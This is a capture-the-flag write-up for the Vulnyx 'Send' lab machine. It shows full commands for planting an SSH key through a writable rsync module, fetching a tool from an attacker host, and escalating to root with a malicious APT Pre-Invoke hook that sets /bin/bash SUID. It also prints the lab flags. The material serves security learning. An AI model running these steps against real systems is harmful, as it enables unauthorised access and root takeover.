# Vulnyx: Send

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `rsync` · `ssh-keygen` · `pspy64` |
| **Tags** | `#rsync` `#AnonymousAccess` `#SSHKey` `#APT` `#PreInvokeHook` `#SUID` `#pspy` |
| **URL** | https://vulnyx.com/machines/ |

An unauthenticated, writable `rsync` module is used to plant an attacker-generated SSH public key directly into `wally`'s `authorized_keys` — no password or existing key ever needed. From there, a world-writable APT hooks directory is abused: a `Pre-Invoke` hook set to run before any `apt` operation executes as root the next time a scheduled update runs.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn send.nyx

PORT      STATE  SERVICE  REASON
22/tcp    open   ssh      syn-ack ttl 64
80/tcp    open   http     syn-ack ttl 64
873/tcp   open   rsync    syn-ack ttl 64
MAC Address: 08:00:27:3E:20:B6 (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **873** — the default port for the `rsync` daemon, the detail that shapes the whole path. A version/script scan against all three fills in the details:

```bash
$ sudo nmap -p 22,80,873 -sCV send.nyx

PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp    open   http     Apache httpd 2.4.59 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.59 (Debian)
873/tcp   open   rsync    (protocol version 31)
MAC Address: 08:00:27:3E:20:B6 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://send.nyx/
```

<img src="../Images/send/Pasted image 20260829130131.png"/>

A content scan turns up nothing beyond a near-empty index page — the web server isn't the way in here:

```bash
$ ffuf -u http://send.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html          [Status: 200, Size: 196, Words: 38, Lines: 8, Duration: 1135ms]
.php                [Status: 200, Size: 196, Words: 38, Lines: 8, Duration: 5ms]
server-status       [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 13ms]
```

### rsync Enumeration

`rsync host::` lists the daemon's modules with no credentials. Two are exposed, and `wally (home)` is a giveaway that a module maps to a user's home directory:

```bash
$ rsync send.nyx::
share          wally (home)
```

Listing the `share` module shows `wally`'s home contents — including `user.txt` — all reachable anonymously:

```bash
$ rsync send.nyx::share
drwx------         4,096  2024/07/11 11:34:21  .
lrwxrwxrwx             9  2023/04/23 03:34:26  .bash_history
-rw-------           220  2023/01/15 07:58:06  .bash_logout
-rw-------         3,526  2023/01/15 07:58:06  .bashrc
-rw-------           807  2023/01/15 07:58:06  .profile
-r--------            33  2024/07/11 11:34:21  user.txt
drwxr-xr-x         4,096  2023/04/29 09:50:29  .local
```

## Initial Access

### Planting an SSH Key via a Writable rsync Module

The `share` module doesn't just allow reads — it accepts writes without authentication, and maps to `wally`'s home on disk. That's enough to drop an `~/.ssh/authorized_keys` of the attacker's choosing: SSH will then accept the matching private key as `wally`, with no password and no pre-existing key involved.

A fresh keypair is generated locally and its public half staged as an `authorized_keys` file:

```bash
$ ssh-keygen -t rsa -N "" -f send_rsa
$ chmod 600 send_rsa
$ mkdir .ssh
$ cp send_rsa.pub .ssh/authorized_keys
```

The `.ssh` folder is pushed straight into `wally`'s home through the module:

```bash
$ rsync -av .ssh send.nyx::share/
sending incremental file list
.ssh/
.ssh/authorized_keys

sent 713 bytes  received 39 bytes  1,504.00 bytes/sec
total size is 563  speedup is 0.75
```

### Shell as wally

The attacker's private key now logs straight in as `wally`:

```bash
$ ssh wally@send.nyx -i send_rsa
wally@send:~$ id
uid=1000(wally) gid=1000(wally) grupos=1000(wally)
wally@send:~$ cat /home/wally/user.txt
9e1d45e31729328b4c8da808760d2108
```

> **User flag:** `9e1d45e31729328b4c8da808760d2108`

## Privilege Escalation

### A Writable APT Hook

With no obvious `sudo` rights, `pspy64` is dropped in to watch for scheduled jobs — the usual way to catch something that runs periodically as root:

```bash
wally@send:/tmp$ wget http://<ATTACKER_IP>:8000/pspy64
wally@send:/tmp$ chmod +x pspy64
wally@send:/tmp$ ./pspy64
```

<img src="../Images/send/Pasted image 20260829130455.png"/>

`pspy` shows a periodic root job running `apt`. That matters because of what a look at `/etc/apt` reveals — the `apt.conf.d` directory is world-writable (`drwxrwxrwx`):

```bash
wally@send:/tmp$ ls -l /etc/apt/
total 32
drwxrwxrwx 2 root root 4096 ago 29 12:28 apt.conf.d
drwxr-xr-x 2 root root 4096 jun 10  2021 auth.conf.d
-rw-r--r-- 1 root root  150 ene 15  2023 listchanges.conf
drwxr-xr-x 2 root root 4096 mar 28  2021 listchanges.conf.d
drwxr-xr-x 2 root root 4096 jun 10  2021 preferences.d
-rw-r--r-- 1 root root 1011 ene 15  2023 sources.list
-rw-r--r-- 1 root root    0 ene 15  2023 sources.list~
drwxr-xr-x 2 root root 4096 jun 10  2021 sources.list.d
drwxr-xr-x 2 root root 4096 jul 11  2024 trusted.gpg.d
```

APT reads every file in `apt.conf.d` as configuration, and that config can register `Pre-Invoke`/`Post-Invoke` hooks — arbitrary shell commands APT runs around its own operations. Since the directory is writable and `apt` runs periodically as root, planting a hook is arbitrary code execution as root. The hook here makes `/bin/bash` SUID root the next time `apt update` runs:

```bash
wally@send:/tmp$ echo 'apt::Update::Pre-Invoke {"chmod 4755 /bin/bash"};' > /etc/apt/apt.conf.d/suid
wally@send:/tmp$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
wally@send:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
```

Once the scheduled `apt` job fires the hook, the SUID bit is set, and `bash -p` keeps root's effective privileges instead of dropping them:

```bash
wally@send:/tmp$ /bin/bash -p
bash-5.1# id
uid=1000(wally) gid=1000(wally) euid=0(root) grupos=1000(wally)
bash-5.1# cat /root/root.txt
78fc0f33441d0fc383b3327233343d41
```

> **Root flag:** `78fc0f33441d0fc383b3327233343d41`

## Takeaways

- An `rsync` module open for anonymous write access is often equivalent to full write access to whatever directory it maps to on disk — planting an `authorized_keys` file this way sidesteps password auth entirely, no credential of any kind needed.
- APT's hook system (`Pre-Invoke`/`Post-Invoke` in `apt.conf.d`) runs arbitrary shell snippets by design — a writable hooks directory is a direct privilege-escalation vector on any system where `apt` itself runs periodically as root.
- `pspy` continues to be the tool that turns "there's probably something scheduled" into "here's exactly what runs, when, and as whom" — essential for catching this class of vulnerability at all.